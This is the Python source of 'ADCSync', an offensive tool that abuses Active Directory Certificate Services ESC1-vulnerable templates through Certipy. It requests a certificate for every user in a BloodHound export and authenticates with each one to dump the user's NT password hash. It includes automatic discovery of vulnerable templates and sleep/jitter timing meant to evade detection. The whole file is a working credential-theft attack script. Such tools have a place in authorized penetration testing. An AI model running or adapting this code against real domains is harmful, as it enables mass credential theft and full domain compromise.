import json
import os
import shutil
import subprocess
import random
import time
from tqdm import tqdm
from pyfiglet import Figlet
import click
import ipaddress
from ldap3 import Server, Connection, ALL, SIMPLE, SYNC, SUBTREE # Print stuff

ascii_art = Figlet(font='slant')
print(ascii_art.renderText('ADCSync'))

if shutil.which("certipy"):
    certipy_client = "certipy"
elif shutil.which("certipy-ad"):
    certipy_client = "certipy-ad"
else:
    print("Certipy not found. Please install Certipy before running ADCSync")
    exit(1)

@click.command()
@click.option('-f', '--file', help='Input User List JSON file from Bloodhound', required=True, type=str)
@click.option('-o', '--output', help='NTLM Hash Output file', required=True, type=str)
@click.option('-ca', help='Certificate Authority', required=True, type=str)
@click.option('-dc-ip', help='IP Address of Domain Controller', required=True, type=str)
@click.option('-u', '--user', help='Username', required=True, type=str)
@click.option('-p', '--password', help='Password', required=False, type=str)
@click.option('-H', '--hashes', help='NTLM hash in format LMHASH:NTHASH or just NTHASH', required=False, type=str)
@click.option('-k', '--kerberos', help='Flag to use Kerberos authentication with ccache file', is_flag=True, default=False)
@click.option('-ccache', help='Path to ccache file for Kerberos authentication', required=False, type=str)
@click.option('-template', help='Template Name vulnerable to ESC1. If not specified, will attempt to find one.', required=False, type=str)
@click.option('-target-ip', help='IP Address of the target machine', required=True, type=str)
@click.option('-s', '--sleep', help='Base sleep time between requests in seconds', required=False, type=float, default=0)
@click.option('-j', '--jitter', help='Jitter percentage (0-100)', required=False, type=float, default=0)

def main(file, output, ca, dc_ip, user, password, hashes, kerberos, ccache, template, target_ip, sleep, jitter):
    # Validate types
    validate_inputs(file, output, dc_ip, user, password, hashes, 
                   kerberos, ccache, target_ip, sleep, jitter)

    # If no template is specified, try to find vulnerable ones
    if not template:
        vulnerable_templates = find_vulnerable_templates(
            dc_ip, user, password, hashes, kerberos, ccache
        )
        if vulnerable_templates:
            template = vulnerable_templates[0]
            print(f"\nUsing vulnerable template: {template}")

    # Read the JSON data from the file
    try:
        with open(file, 'r', encoding='utf-8') as file_obj:
            data = json.load(file_obj)
    except json.JSONDecodeError:
        print(f"Error: The file '{file}' does not contain valid JSON.")
        exit(1)

    # Extract the "name" values
    names = []
    for item in data['data']:
        name = item['Properties']['name']
        names.append(name)

    # Create the "certificates" folder if it doesn't exist
    certificates_folder = 'certificates'
    if not os.path.exists(certificates_folder):
        os.makedirs(certificates_folder)

    # Extract the domain from the username and store it in a dictionary
    usernames_with_domains = {}
    for item in data['data']:
        name = item['Properties']['name']
        domain = name.split('@')[-1]  # Extract the domain from the username
        username = name.split('@')[0].lower()
        usernames_with_domains[f'{username}@{domain}'] = domain

    # Execute certipy req command for each name
    print('Grabbing user certs:')
    for name in tqdm(names):
        if sleep > 0:
            jitter_multiplier = 1 + (random.uniform(-jitter, jitter) / 100)
            sleep_time = sleep * jitter_multiplier
            time.sleep(sleep_time)
        
        # Extract the part before the "@" symbol and convert it to lowercase
        username = name.split('@')[0].lower()
        domain = usernames_with_domains.get(f'{username}@{domain}')

        command = [certipy_client, 'req', '-u', user, '-target-ip', target_ip,
                  '-dc-ip', dc_ip, '-ca', ca, '-template', template, '-upn', name]
        
        if password:
            command.extend(['-p', password])
        elif hashes:
            command.extend(['-hashes', hashes])
        elif kerberos:
            command.extend(['-k', '-ccache', ccache])

        process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Check the return code and error output of certipy
        if "Could not connect: timed out" in process.stdout:
            print("Could not connect: timed out.")
            exit(1)

        # Move the generated .pfx file to the "certificates" folder if it exists
        for filename in os.listdir('.'):
            if filename.endswith('.pfx') and filename.startswith(username):
                destination = os.path.join(certificates_folder, filename)
                shutil.move(filename, destination)

    # Create the "caches" folder if it doesn't exist
    caches_folder = 'caches'
    if not os.path.exists(caches_folder):
        os.makedirs(caches_folder)

    # Execute command for each .pfx file in the "certificates" folder and record the output
    with open(output, 'a') as output_file:
        for filename in os.listdir(certificates_folder):
            if filename.endswith('.pfx'):
                certificate = os.path.join(certificates_folder, filename)
                username = os.path.splitext(filename.split('@')[0].lower())[0]

                # Get the domain associated with the username
                domain = usernames_with_domains.get(f'{username}@{domain}')

                command = [certipy_client, 'auth', '-pfx', certificate, '-username', username, '-dc-ip', dc_ip]
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate()

                # Extract the NT hash from the stdout
                output_lines = stdout.strip().split('\n')
                nt_hash = output_lines[-1].split(': ')[1]

                # Format the output
                output_format = f'{domain}/{username}::{nt_hash}:::'

                # Print the output to the terminal
                print(output_format)

                # Write the formatted output to the output file
                output_file.write(output_format + '\n')

                # Move the .ccache file to the "caches" folder if it exists
                ccache_file = f'{username}.ccache'
                if os.path.exists(ccache_file):
                    shutil.move(ccache_file, os.path.join(caches_folder, ccache_file))

def validate_inputs(file: str, output: str, dc_ip: str, user: str, 
                   password: str, hashes: str, kerberos: bool, ccache: str,
                   target_ip: str, sleep: float, jitter: float) -> None:

    # Validate Authentication Choice
    auth_methods = sum(bool(x) for x in [password, hashes, (kerberos and ccache)])
    if auth_methods != 1:
        print("Error: Exactly one authentication method must be provided (password, hashes, or ccache)")
        exit(1)

    # NTLM Hash Validation
    if hashes:
        if ':' in hashes:
            lm_hash, nt_hash = hashes.split(':')
            if not all(len(h) == 32 and all(c in '0123456789abcdefABCDEF' for c in h) 
                      for h in [lm_hash, nt_hash] if h):
                print("Error: Invalid hash format. Expected LMHASH:NTHASH or just NTHASH")
                exit(1)
        else:
            if not (len(hashes) == 32 and all(c in '0123456789abcdefABCDEF' for c in hashes)):
                print("Error: Invalid hash format. Expected 32 character hex string")
                exit(1)

    # ccache Validation
    if kerberos:
        if not ccache:
            print("Error: ccache file path must be provided when using Kerberos authentication")
            exit(1)
        if not os.path.isfile(ccache):
            print(f"Error: ccache file '{ccache}' does not exist")
            exit(1)

    # IP Address Validation
    try:
        ipaddress.ip_address(dc_ip)
        ipaddress.ip_address(target_ip)
    except ValueError:
        print("Error: Invalid IP address format for dc-ip or target-ip")
        exit(1)

    # Sleep Timing Validation
    if not isinstance(sleep, float) or sleep < 0:
        print("Error: Sleep time must be a non-negative float value")
        exit(1)

    # Jitter Validation
    if not isinstance(jitter, float) or not 0 <= jitter <= 100:
        print("Error: Jitter must be a float between 0 and 100 percent")
        exit(1)

    # File Path Validation
    if not os.path.isfile(file):
        print(f"Error: Input file '{file}' does not exist")
        exit(1)

    # Output File Validation
    if os.path.exists(output):
        if not os.access(output, os.W_OK):
            print(f"Error: Output file '{output}' exists but is not writable")
            exit(1)
    else:
        try:
            with open(output, 'a') as f:
                pass
        except IOError:
            print(f"Error: Cannot create output file '{output}'")
            exit(1)

def find_vulnerable_templates(dc_ip: str, user: str, password: str = None, 
                            hashes: str = None, kerberos: bool = False, 
                            ccache: str = None) -> list[str]:

    # Build command based on authentication method
    command = [certipy_client, 'find', '-u', user, '-dc-ip', dc_ip, '-vulnerable']
    
    if password:
        command.extend(['-p', password])
    elif hashes:
        command.extend(['-hashes', hashes])
    elif kerberos:
        command.extend(['-k', '-ccache', ccache])

    print("Searching for vulnerable certificate templates...")
    process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    if process.returncode != 0:
        print(f"Error running certipy find: {process.stderr}")
        exit(1)

    # Parse output to find ESC1 vulnerable templates
    vulnerable_templates = []
    output_lines = process.stdout.split('\n')
    in_vulnerabilities_section = False
    current_template = None
    
    for line in output_lines:
        if '[!] Vulnerabilities' in line:
            in_vulnerabilities_section = True
            continue
        elif in_vulnerabilities_section:
            if line.strip().startswith('ESC1'):
                if current_template:
                    vulnerable_templates.append(current_template)
            elif 'CA Name' in line:
                current_template = line.split(':')[1].strip()
            elif not line.strip() or '[' in line:
                current_template = None
                if '[' in line:
                    in_vulnerabilities_section = False

    if not vulnerable_templates:
        print("No templates vulnerable to ESC1 were found.\nPlease specify a template name.")
        exit(1)

    print(f"Found {len(vulnerable_templates)} vulnerable template(s):")
    for template in vulnerable_templates:
        print(f"  - {template}")
    
    return vulnerable_templates

if __name__ == '__main__':
    main()
